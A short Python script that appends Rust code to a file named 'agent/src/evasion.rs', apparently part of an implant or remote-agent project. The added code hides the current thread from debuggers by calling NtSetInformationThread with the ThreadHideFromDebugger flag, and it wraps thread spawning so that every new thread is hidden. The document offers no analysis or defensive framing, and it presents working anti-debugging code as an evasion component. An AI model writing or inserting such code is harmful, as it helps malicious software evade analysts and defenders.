import sys

with open('agent/src/evasion.rs', 'r') as f:
    text = f.read()

hide_decl = """
#[cfg(windows)]
pub fn hide_current_thread() {
    unsafe {
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\\0".as_ptr() as _);
        if !ntdll.is_null() {
            let func = winapi::um::libloaderapi::GetProcAddress(ntdll, b"NtSetInformationThread\\0".as_ptr() as _);
            if !func.is_null() {
                let nt_set_info_thread: extern "system" fn(winapi::um::winnt::HANDLE, u32, *mut winapi::ctypes::c_void, u32) -> i32 = std::mem::transmute(func);
                nt_set_info_thread(
                    -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
                    0x11, // ThreadHideFromDebugger
                    std::ptr::null_mut(),
                    0
                );
            }
        }
    }
}

#[cfg(not(windows))]
pub fn hide_current_thread() {}

pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
where
    F: FnOnce() -> T + Send + 'static,
    T: Send + 'static,
{
    std::thread::spawn(move || {
        hide_current_thread();
        f()
    })
}
"""

text = text + hide_decl

with open('agent/src/evasion.rs', 'w') as f:
    f.write(text)

